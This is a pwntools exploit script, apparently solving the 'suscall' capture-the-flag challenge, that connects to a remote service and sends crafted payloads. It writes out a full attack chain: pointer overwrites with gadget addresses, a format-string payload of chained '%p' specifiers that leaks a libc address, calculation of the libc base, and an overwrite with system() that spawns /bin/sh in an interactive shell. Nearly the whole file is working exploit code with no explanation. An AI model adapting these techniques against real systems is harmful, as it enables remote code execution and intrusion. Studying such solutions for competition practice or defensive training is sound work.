from pwn import *


PART_WAY_INTO_DO_OPEN = 0x04017a3
READ_LINE = 0x040197f
PRINTF = 0x401150

context.log_level = 'debug'

p = remote('suscall.shellweplayaga.me', 505)
TICKET = b'ticket{}'
p.sendline(TICKET)


p.readuntil('file')

input('attach gdb')

p.sendline(b'a')
p.sendline(b'a')

pl = b'A'*8
pl += p64(PART_WAY_INTO_DO_OPEN) # read_line: Jump to next trigger
#pl += p64(0x919293949596)
pl = pl.strip(b'\x00')
p.sendline(pl)

pl = b'A'*8
pl += p64(0x404110 + 0x20) # Call gadget
pl = pl.strip(b'\x00')
p.sendline(pl)

pl = p64(0xcccc01010101cc03)
pl += p64(READ_LINE) # reset: Read in over self
pl = pl.strip(b'\x00')
p.sendline(pl)

# Call gadget
pl = p64(PRINTF) # Printf
#pl = p64(0x919293949596)
pl = pl.strip(b'\x00')
p.sendline(pl)




for i in range(0, 32*13-8):
    p.sendline(b'a')


cyclic_gen = cyclic(1*1024+32+8*7+8*4)

pl = b'sus=1 /bin/sh #%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p'

pl = pl + cyclic_gen[len(pl):]

pl += b'A'*8
pl += b'B'*8
pl += b'C'*8
pl += b'D'*8
pl += b'E'*8
pl += b'F'*8 # heap ptr
pl += p64(0xcccccc041001cc1c)
# Step 1
pl += p64(0x4040e8+0x20)
#pl += b'G'*8 # crash 1

pl = pl.strip(b'\x00')
p.sendline(pl)

#p.interactive()

res = p.readuntil(b'040|')
leak = int(res.strip(b'|').rsplit(b'|',1)[-1], 16)

print('leak:', hex(leak))

libc = ELF('./libc.so.6')
libc.address = leak - 0x267040
print('libc:', hex(libc.address))

system_addr = libc.symbols['system']

input("Press Enter to continue...")

pl = p64(0x04015d0) # rop nop
pl = pl.strip(b'\x00')
p.sendline(pl)

input("Press Enter to continue...")

pl = p64(system_addr)
pl = pl.strip(b'\x00')
p.sendline(pl)

p.interactive()
